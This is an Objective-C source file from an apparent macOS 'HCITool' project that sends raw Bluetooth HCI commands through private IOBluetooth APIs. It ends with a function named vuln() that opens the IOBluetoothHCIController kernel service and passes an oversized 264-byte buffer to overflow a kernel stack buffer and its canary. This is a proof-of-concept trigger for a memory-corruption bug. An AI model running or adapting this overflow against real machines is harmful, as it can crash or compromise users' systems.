//
//  ViewController.m
//  HCITool
//
//  Created by Alsey Coleman Miller on 3/23/18.
//  Copyright © 2018 Pure Swift. All rights reserved.
//

#import "ViewController.h"
#import <IOBluetooth/IOBluetooth.h>
#import "IOBluetoothHostController.h"
@import IOKit;
#import <IOKit/IOKitLib.h>

struct BluetoothCall {
    uint64_t args[7];
    uint64_t sizes[7];
    uint64_t index;
};

struct BluetoothCallB {
    uint8 a[116];
};

struct HCIRequest {
    uint32 identifier;
};

/* Host Controller and Baseband */
#define OGF_HOST_CTL        0x03

#define OCF_READ_CONN_ACCEPT_TIMEOUT    0x0015
typedef struct {
    uint8_t        status;
    uint16_t    timeout;
} __attribute__ ((packed)) read_conn_accept_timeout_rp;
#define READ_CONN_ACCEPT_TIMEOUT_RP_SIZE 3

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    _IOBluetoothHostController *hciController = [IOBluetoothHostController defaultController];
    
    NSString *address = [hciController addressAsString];
    
    NSLog(@"Address: %@ %@", address, hciController.className);
    
    [self readConnectionTimeout:nil];
    //[self writeName:nil];
    
    
    /*
    unsigned int createRequestError = [hciController requestWithTimeout:0x1770 isSynchronous:YES device:0x0];
    
    if (createRequestError) {
        
        printf("Error: %08x\n", createRequestError);
    }*/
    
    // send HCI command
    //error = BluetoothHCIDispatchUserClientRoutine(&output1, &outputHCI, &outputSize);
    
    // end HCI command
    //error = BluetoothHCIDispatchUserClientRoutine(&a, 0x0, 0x0);
    
    /*
     if (error) {
     
     NSLog(@"Error %@", @(error));
     return;
     }*/
    
    //NSLog(@"BluetoothHCIReadConnectionAcceptTimeout %@", @(outputHCI));
}

- (void)setRepresentedObject:(id)representedObject {
    [super setRepresentedObject:representedObject];

    // Update the view, if already loaded.
}

- (void)readConnectionTimeout:(id)sender {
    
    _IOBluetoothHostController *hciController = [IOBluetoothHostController defaultController];
    
    uint16 connectionAcceptTimeout = 0;
    
    int readTimeout = [hciController BluetoothHCIReadConnectionAcceptTimeout:&connectionAcceptTimeout];
    
    if (readTimeout) {
        
        NSLog(@"Error %@", @(readTimeout));
        return;
    }
    
    NSLog(@"BluetoothHCIReadConnectionAcceptTimeout %@", @(connectionAcceptTimeout));
    
    // manually
    
    struct HCIRequest request;
    uint16 output;
    size_t outputSize = sizeof(output);
    
    int error = BluetoothHCIRequestCreate(&request, 1000, nil, 0);
    
    NSLog(@"Created request: %u", request.identifier);
    
    if (error) {
        
        BluetoothHCIRequestDelete(request);
        
        printf("Couldnt create error: %08x\n", error);
    }
    
    size_t commandSize = 3;
    uint8 * command = malloc(commandSize);
    command[0] = 0x15;
    command[1] = 0x0C;
    command[2] = 0;
    
    error = _BluetoothHCISendRawCommand(request, command, 3);
    
    if (error) {
        
        BluetoothHCIRequestDelete(request);
        printf("Send HCI command Error: %08x\n", error);
    }
    
    sleep(0x1);
    
    BluetoothHCIRequestDelete(request);
    
    NSLog(@"BluetoothHCIReadConnectionAcceptTimeout %@", @(output));
}

- (void)writeName:(id)sender {
    
    _IOBluetoothHostController *hciController = [IOBluetoothHostController defaultController];
    
    unsigned char name[256];
    
    name[0] = 'C';
    name[1] = 'D';
    name[2] = 'A';
    
    int setNameError = [hciController BluetoothHCIWriteLocalName:&name];
    
    if (setNameError) {
        
        NSLog(@"Error %@", @(setNameError));
        return;
    }
    
    NSLog(@"BluetoothHCIWriteLocalName");
    
    // manually
    
    struct HCIRequest request;
    int error = BluetoothHCIRequestCreate(&request, 1000, nil, 0);
    
    NSLog(@"Created request: %lu", request.identifier);
    
    if (error) {
        
        BluetoothHCIRequestDelete(request);
        printf("Couldnt create error: %08x\n", error);
    }
    
    size_t commandSize = 248 + 3;
    unsigned char command[commandSize];
    memset(&command, '\0', commandSize);
    command[0] = 0x13;
    command[1] = 0x0C;
    command[2] = 248;
    command[3] = 'A';
    command[4] = 'B';
    command[5] = 'C';
    
    error = BluetoothHCISendRawCommand(request, &command, commandSize);
    
    if (error) {
        
        BluetoothHCIRequestDelete(request);
        printf("Send HCI command Error: %08x\n", error);
    }
    
    sleep(0x1);
    
    BluetoothHCIRequestDelete(request);
}


@end


/*
int __sendRawHCIRequest(int arg0, int arg1, int arg2, int arg3) {
    var_8 = arg0;
    var_10 = arg1;
    var_18 = arg2;
    var_20 = arg3;
    var_A0 = 0x4;
    var_A8 = 0x198f;
    var_98 = &var_A8;
    var_24 = _BluetoothHCIDispatchUserClientRoutine(&var_98, &var_A4, &var_A0);
    if (sign_extend_64((0x0 != var_24 ? 0x1 : 0x0) & 0x1 & 0xff) == 0x0) {
        var_98 = &var_A4;
        var_24 = _BluetoothHCIDispatchUserClientRoutine(&var_98, var_18, var_20);
        var_98 = &var_A4;
        _BluetoothHCIDispatchUserClientRoutine(&var_98, 0x0, 0x0);
    }
    rax = var_24;
    return rax;
}
*/

int _BluetoothHCISendRawCommand(struct HCIRequest request, void *commandData, size_t commmandSize) {
    
    //var_8 = arg0;
    //var_10 = arg1;
    //var_18 = arg2;
    int errorCode = 0; // var_4
    
    //struct BluetoothCall call; // var_90
    size_t size = 0x74;
    //assert(size == sizeof(call));
    void *call = malloc(size);
    memset(call, 0x0, size);
    
    if ((commandData != 0x0) && (commmandSize > 0x0)) {
        
        uint32 *callPointer = (uint32 *)call;
        callPointer[0] = request.identifier;
        callPointer[1] = commandData;
        callPointer[2] = commmandSize;
        //call = (struct BluetoothCallB)&request; //var_90 = &var_8;
        
        errorCode = BluetoothHCIDispatchUserClientRoutine(&call, 0x0, 0x0);
    }
    else {
        errorCode = 0xe00002c2;
    }
    
    return errorCode;
}

int vuln(void) {
    
    /* Finding vuln service */
    io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
                                IOServiceMatching("IOBluetoothHCIController"));
    
    if (!service) {
        return -1;
    }
    
    /* Connect to vuln service */
    io_connect_t port = (io_connect_t) 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
    IOObjectRelease(service);
    if (kr != kIOReturnSuccess) {
        return kr;
    }
    
    printf(" [+] Opened connection to service on port: %d\n", port);
    
    struct BluetoothCall a;
    
    a.sizes[0] = 0x1000;
    a.args[0] = (uint64_t) calloc(a.sizes[0], sizeof(char));
    
    /* This arguments overflows a local buffer and the adjacent stack canary */
    a.sizes[1] = 264;
    a.args[1] = (uint64_t) calloc(a.sizes[1], sizeof(char));
    memset((void *)a.args[1], 'A', a.sizes[1]);
    
    /* Call IOBluetoothHCIUserClient::DispatchHCIReadLocalName() */
    a.index = 0x2d;
    
    /* Debug */
    for(int i = 0; i < 120; i++) {
        if(i % 8 == 0) printf("\n");
        printf("\\x%02x", ((unsigned char *)&a)[i]);
    }
    printf("\n");
    fflush(stdout);
    
    kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
                             (uint32_t) 0,       /* Selector */
                             NULL, 0,           /* input, inputCnt */
                             (const void*) &a,   /* inputStruct */
                             sizeof(a),           /* inputStructCnt */
                             NULL, NULL, NULL, NULL); /* Output stuff */
    printf("kr: %08x\n", kr);
    
    return IOServiceClose(port);
}

